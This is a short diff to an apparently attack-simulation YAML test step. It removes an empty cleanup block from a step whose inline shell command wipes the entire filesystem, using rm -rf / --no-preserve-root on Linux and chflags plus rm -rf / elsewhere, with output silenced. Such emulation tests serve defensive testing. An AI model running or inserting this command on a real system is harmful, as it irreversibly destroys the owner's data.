@@ -18,6 +18,3 @@ steps:
       inline: |
         [ "$(uname)" = 'Linux' ] && rm -rf / --no-preserve-root > /dev/null 2> /dev/null || chflags -R 0 / && rm -rf / > /dev/null 2> /dev/null
       executor: sh
-      cleanup:
-        inline: ""
-        executor: sh
